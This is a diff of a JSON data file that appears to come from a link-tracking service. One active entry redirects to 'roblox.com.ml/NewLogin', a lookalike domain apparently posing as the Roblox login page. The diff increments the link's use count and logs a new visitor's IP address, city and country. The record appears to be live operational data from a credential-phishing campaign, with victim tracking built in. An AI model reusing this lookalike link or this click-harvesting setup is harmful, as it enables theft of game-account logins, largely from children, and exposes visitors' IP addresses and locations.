@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 297,
+    "useCount": 298,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2488,6 +2488,14 @@
         "city": "Eustaquio Lopez",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777015334441,
+        "ip": "104.232.220.55",
+        "country": "Belgium",
+        "city": "Antwerp",
+        "flag": "🇧🇪",
+        "countryCode": "BE"
       }
     ]
   },
